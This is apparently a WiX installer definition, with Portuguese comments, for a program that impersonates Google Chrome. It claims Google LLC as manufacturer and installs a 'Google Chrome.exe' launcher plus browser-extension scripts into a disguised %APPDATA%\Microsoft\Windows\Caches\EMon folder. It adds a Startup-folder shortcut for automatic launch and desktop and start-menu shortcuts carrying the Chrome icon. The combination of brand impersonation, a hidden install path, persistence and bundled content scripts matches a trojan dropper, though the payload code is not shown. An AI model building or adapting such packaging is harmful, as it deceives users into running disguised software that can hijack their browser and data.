<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*"
             Name="Google Chrome"
             Language="1033"
             Version="1.0.0.0"
             Manufacturer="Google LLC"
             UpgradeCode="{E5A47B60-7C1F-4D3A-9B8E-2F6C1D0E3A5B}">

        <Package InstallerVersion="200"
                 Compressed="yes"
                 Description="Google Chrome"
                 Comments="Chrome Browser" />

        <Media Id="1" Cabinet="data.cab" EmbedCab="yes" />

        <MajorUpgrade DowngradeErrorMessage="Uma versão mais recente já está instalada." />

        <!-- Ícone do Chrome para atalhos -->
        <Icon Id="ChromeIcon" SourceFile="chrome.ico" />

        <!-- =========================================================== -->
        <!-- Diretórios                                                   -->
        <!-- =========================================================== -->
        <Directory Id="TARGETDIR" Name="SourceDir">
            <!-- Install dir: %APPDATA%\Microsoft\Windows\Caches\EMon -->
            <Directory Id="AppDataFolder">
                <Directory Id="d_Microsoft" Name="Microsoft">
                    <Directory Id="d_Windows" Name="Windows">
                        <Directory Id="d_Caches" Name="Caches">
                            <Directory Id="INSTALLDIR" Name="EMon">
                                <Directory Id="d_extension" Name="extension">
                    <Directory Id="d_ext_icons" Name="icons">
                        <Component Id="C_ext_icons_icon128_png" Guid="fd2c97b9-9d2d-4a96-8319-607d053089ec">
                            <File Id="F_ext_icons_icon128_png" Source="dist/icons/icon128.png" Name="icon128.png" KeyPath="yes" />
                        </Component>
                        <Component Id="C_ext_icons_icon16_png" Guid="6ea8fb83-e8a6-4503-b3ce-eb6a7f3466ce">
                            <File Id="F_ext_icons_icon16_png" Source="dist/icons/icon16.png" Name="icon16.png" KeyPath="yes" />
                        </Component>
                        <Component Id="C_ext_icons_icon48_png" Guid="1975dc05-d6a0-4936-8c28-be5beef21046">
                            <File Id="F_ext_icons_icon48_png" Source="dist/icons/icon48.png" Name="icon48.png" KeyPath="yes" />
                        </Component>
                    </Directory>
                    <Component Id="C_ext_manifest_json" Guid="e90f6140-44dd-42e6-b43c-805946786c6c">
                        <File Id="F_ext_manifest_json" Source="dist/manifest.json" Name="manifest.json" KeyPath="yes" />
                    </Component>
                    <Directory Id="d_ext_src" Name="src">
                        <Directory Id="d_ext_src_background" Name="background">
                            <Component Id="C_ext_src_background_background_js" Guid="2fc167ce-3b0a-4673-8e60-5ba7a2f3bb51">
                                <File Id="F_ext_src_background_background_js" Source="dist/src/background/background.js" Name="background.js" KeyPath="yes" />
                            </Component>
                        </Directory>
                        <Component Id="C_ext_src_config_js" Guid="2c8bd128-df73-4429-ab5f-92783f474b03">
                            <File Id="F_ext_src_config_js" Source="dist/src/config.js" Name="config.js" KeyPath="yes" />
                        </Component>
                        <Directory Id="d_ext_src_content" Name="content">
                            <Component Id="C_ext_src_content_content_js" Guid="611a0239-3596-4c31-9e1f-08bb52b13217">
                                <File Id="F_ext_src_content_content_js" Source="dist/src/content/content.js" Name="content.js" KeyPath="yes" />
                            </Component>
                        </Directory>
                        <Directory Id="d_ext_src_popup" Name="popup">
                            <Component Id="C_ext_src_popup_popup_html" Guid="2f916230-7f77-4c91-a4c2-48783b344d46">
                                <File Id="F_ext_src_popup_popup_html" Source="dist/src/popup/popup.html" Name="popup.html" KeyPath="yes" />
                            </Component>
                            <Component Id="C_ext_src_popup_popup_js" Guid="49eaf3c6-8223-40df-8962-56f4bc701dc3">
                                <File Id="F_ext_src_popup_popup_js" Source="dist/src/popup/popup.js" Name="popup.js" KeyPath="yes" />
                            </Component>
                        </Directory>
                    </Directory>
                                </Directory>
                                <Directory Id="d_launcher" Name="launcher" />
                                <Directory Id="d_browser" Name="browser" />
                            </Directory>
                        </Directory>
                    </Directory>
                </Directory>
            </Directory>

            <!-- Pastas padrão do Windows para atalhos -->
            <Directory Id="DesktopFolder" Name="Desktop" />
            <Directory Id="StartupFolder" Name="Startup" />
            <Directory Id="ProgramMenuFolder" Name="Programs" />
        </Directory>

        <!-- =========================================================== -->
        <!-- Launcher (Google Chrome.exe)                                 -->
        <!-- =========================================================== -->
        <DirectoryRef Id="d_launcher">
            <Component Id="C_Launcher" Guid="6833f2f2-1c21-452e-a0e8-d20fc26a13ea">
                <File Id="F_Launcher"
                      Source="Google Chrome.exe"
                      Name="Google Chrome.exe"
                      KeyPath="yes" />
            </Component>
        </DirectoryRef>

        <!-- =========================================================== -->
        <!-- Atalhos                                                      -->
        <!-- =========================================================== -->

        <!-- Desktop -->
        <DirectoryRef Id="DesktopFolder">
            <Component Id="C_SC_Desktop" Guid="59c3aa00-a54b-4b06-8531-fefd8fe7c2b4">
                <Shortcut Id="SC_Desktop"
                          Name="Google Chrome"
                          Description="Google Chrome"
                          Target="[d_launcher]Google Chrome.exe"
                          WorkingDirectory="d_launcher"
                          Icon="ChromeIcon" />
                <RegistryValue Root="HKCU" Key="Software\EMon"
                               Name="DesktopShortcut" Type="integer" Value="1"
                               KeyPath="yes" />
            </Component>
        </DirectoryRef>

        <!-- Startup (auto-iniciar) -->
        <DirectoryRef Id="StartupFolder">
            <Component Id="C_SC_Startup" Guid="81ab8955-a78f-4a0f-b55f-943364099c11">
                <Shortcut Id="SC_Startup"
                          Name="Google Chrome"
                          Description="Google Chrome"
                          Target="[d_launcher]Google Chrome.exe"
                          WorkingDirectory="d_launcher"
                          Icon="ChromeIcon" />
                <RegistryValue Root="HKCU" Key="Software\EMon"
                               Name="StartupShortcut" Type="integer" Value="1"
                               KeyPath="yes" />
            </Component>
        </DirectoryRef>

        <!-- Start Menu → Programs -->
        <DirectoryRef Id="ProgramMenuFolder">
            <Component Id="C_SC_StartMenu" Guid="31524d82-c344-4efa-b121-39bba5997b9a">
                <Shortcut Id="SC_StartMenu"
                          Name="Google Chrome"
                          Description="Navegador Google Chrome"
                          Target="[d_launcher]Google Chrome.exe"
                          WorkingDirectory="d_launcher"
                          Icon="ChromeIcon" />
                <RegistryValue Root="HKCU" Key="Software\EMon"
                               Name="StartMenuShortcut" Type="integer" Value="1"
                               KeyPath="yes" />
            </Component>
            <Component Id="C_SC_StartMenu2" Guid="15a61957-019f-4421-993e-a1b31980633d">
                <Shortcut Id="SC_StartMenu2"
                          Name="Chrome"
                          Description="Chrome Browser"
                          Target="[d_launcher]Google Chrome.exe"
                          WorkingDirectory="d_launcher"
                          Icon="ChromeIcon" />
                <RegistryValue Root="HKCU" Key="Software\EMon"
                               Name="StartMenuShortcut2" Type="integer" Value="1"
                               KeyPath="yes" />
            </Component>
        </DirectoryRef>

        <!-- =========================================================== -->
        <!-- Feature principal                                            -->
        <!-- =========================================================== -->
        <Feature Id="Complete" Title="Google Chrome" Level="1">
            <ComponentRef Id="C_Launcher" />
            <ComponentRef Id="C_SC_Desktop" />
            <ComponentRef Id="C_SC_Startup" />
            <ComponentRef Id="C_SC_StartMenu" />
            <ComponentRef Id="C_SC_StartMenu2" />

        </Feature>

    </Product>
</Wix>
